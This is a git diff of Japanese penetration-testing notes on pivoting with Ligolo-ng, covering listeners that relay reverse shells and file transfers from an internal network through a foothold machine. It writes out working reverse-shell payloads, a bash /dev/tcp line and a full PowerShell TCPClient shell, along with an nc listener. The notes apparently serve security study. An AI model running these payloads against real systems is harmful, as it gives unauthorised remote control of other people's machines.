@@ -227,7 +227,7 @@ ip a show
 
 ## Listener w/ Ligolo-ng 
 
-- 用途：**ツール転送**やSMB接続、リバースシェル等の用途で使う
+- 用途：**ツール転送**やSMB接続、**リバースシェル接続**などの用途で使う
 	- 例えばローカルNW内のマシンに対し、攻撃者の用意したHTTPサーバー経由でMimikatzを送りたいときなど
 
 - 以下、[Tunneling w/ Ligolo-ng](#Tunneling%20w/%20Ligolo-ng)のステップ７で`start`としてから実行するものとする
@@ -242,12 +242,11 @@ listener_add --addr 0.0.0.0:<agent_listen_port> --to 127.0.0.1:<attacker_listen_
 - →ターゲットからの通信をAgent経由でProxy（攻撃者マシン）に転送するようになる
 
 2. ローカルNWのAgent以外のマシン上から、Agentのリスナーポートに接続する
-	- 通信方向: ローカルNWの他のマシン → 足場マシンのlistener → トンネル → 攻撃者マシン
+	- 通信方向: ローカルNWのAgent以外のマシン → 足場マシン(Agent)のlistener → トンネル → 攻撃者マシン
 ```bash
-# 内部の他のマシンから
-# ⚠️AgentIPは内部NW側のIP
-curl http://<AgentIP>:<agent_listen_port>
+curl http://<agent_IP>:<agent_listen_port>
 ```
+- AgentIPには内部NWインターフェースのIPを指定すること
 
 ### 具体的なユースケース：リバースシェル
 
@@ -257,7 +256,9 @@ listener_add --addr 0.0.0.0:<agent_listen_port(任意)> --to 127.0.0.1:<attacker
 
 listener_list
 ```
+
 ![](../../../画像ファイル/Pasted%20image%2020251120124523.png)
+
 $$Agentが1234portでリッスンし、通信を攻撃者のマシンの4321ポートにリダイレクト$$
 
 2. 攻撃者のマシン(Proxy)上で新たなターミナルを開き、ncリスナーを立てる
@@ -268,17 +269,17 @@ sudo rlwrap nc -lvnp <attacker_listen_port>
 3. ローカルNW側のAgent以外のマシン上から、Agentに対しリバースシェルペイロードを実行
 ```zsh
 # linux
-bash -i >& /dev/tcp/<AgentLocalIP>/<agent_listen_port> 0>&1
+bash -i >& /dev/tcp/<agent_local_IP>/<agent_listen_port> 0>&1
 
 # windows
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<AgentLocalIP>',<agent_listen_port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<agent_local_IP>',<agent_listen_port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
 4. 攻撃者のマシンでローカルNW側のマシンのリバースシェルを確立
 
 ### 具体的なユースケース：ファイル転送
 
-ローカルNWから攻撃者のマシンでホストしているHTTPサーバーに直接アクセスできないときに使う
+ローカルNWから攻撃者のマシンでホストしているHTTPサーバーに直接アクセスできないときに使う。
 
 1. 攻撃者のマシンでWebサーバーをホスト
 ```zsh
@@ -292,13 +293,14 @@ listener_add --addr 0.0.0.0:<agent_listen_port(任意)> --to 127.0.0.1:<HTTP_Por
 
 3. ローカルNWからファイルダウンロード
 ```powershell
-Invoke-WebRequest -Uri http://<AgentLocalIP>:<HTTP_Port>/<file> -Outfile <output_dir>
+Invoke-WebRequest -Uri http://<agent_local_IP>:<HTTP_Port>/<file> -Outfile <output_dir>
 ```
 
 ## localhostサービスへのアクセス w/ Ligolo-ng
 
 - 用途：Agentで`localhost`でしかアクセスできないサービスにアクセスできるようにする
-- 具体例：Agent(足場)マシンでSSHが動いているが、iptablesで外部からの22番ポートが閉じられている(localhost:22 でしか接続できない)とき、アクセスできるようにする
+	- 0.0.0.0で接続を受け付けているが、FWにより接続できないときも有効
+- 具体例：Agent上で`netstat -ano`をじっこ
 
 1. Ligolo-ng専用のマジックCIDRを使用する
 ```zsh
